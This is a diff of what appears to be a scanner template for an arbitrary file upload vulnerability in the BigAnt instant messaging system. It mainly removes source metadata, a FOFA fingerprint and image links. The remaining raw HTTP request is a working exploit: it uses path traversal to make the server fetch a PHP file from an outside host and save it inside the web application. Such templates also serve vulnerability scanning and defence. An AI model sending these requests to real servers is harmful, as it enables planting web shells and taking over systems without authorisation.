@@ -3,12 +3,8 @@ info:
   name: 杭州九麒科技BigAnt即时通讯系统 Dispersed Orgupload_file任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/frg81bqxh57rvt6e'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: frg81bqxh57rvt6e
-    fofa: app="BigAnt-Admin"
 http:
 - raw:
   - 'GET /api/DispersedOrg/upload_file?server_id=1&path=/data/../Application/qaz1.php&file_url=http://192.168.110.1:8000/1.php HTTP/1.1
@@ -21,7 +17,6 @@ http:
 
     Content-Type: application/x-www-form-urlencoded
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777323218-3dce42eb-58a8-4167-a03f-60da41052f2c.png)
 
     访问上传的地址'
   redirects: false
@@ -38,9 +33,7 @@ http:
 
     Accept: */*
 
-    Content-Type: application/x-www-form-urlencoded
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777323679-487a413d-a6d9-429d-ae71-2b94bb76f854.png)'
+    Content-Type: application/x-www-form-urlencoded'
   redirects: false
   matchers:
   - status:
